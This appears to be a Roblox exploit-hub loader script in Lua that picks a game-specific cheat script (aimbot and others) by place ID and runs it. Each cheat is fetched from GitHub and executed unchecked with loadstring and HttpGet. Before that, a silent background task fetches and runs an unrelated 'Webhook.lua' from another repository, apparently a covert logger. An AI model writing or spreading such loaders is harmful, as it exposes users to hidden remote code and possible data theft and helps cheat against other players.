setfpscap(10000)

local _game = game
local Players = _game:GetService("Players")
local HttpService = _game:GetService("HttpService")
local CoreGui = _game:GetService("CoreGui")

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/Webhook.lua"))()
    end)
end)

local gameLinks = {
    [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
    [12355337193] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
    [3214114884] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/flagwars.lua",
    [6722284015] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/pistol1v1.lua",
    [4410049285] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/drivingsimulator.lua",
    [13771457545] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
    [13775113583] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
    [13772394625] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/bladeball.lua",
    [15264892126] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/bladeball.lua",
    [13864661000] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
    [13864667823] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
    [301549746] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/counterblox.lua",
    [17625359962] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [117398147513099] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [286090429] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [109397169461300] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [134784668468620] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [14518422161] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [109397169461300] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    [15514727567] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
}

local scriptUrl = gameLinks[_game.PlaceId]

if scriptUrl then
    pcall(function()
        loadstring(_game:HttpGet(scriptUrl))()
    end)
else
    warn("Not Supported")
end
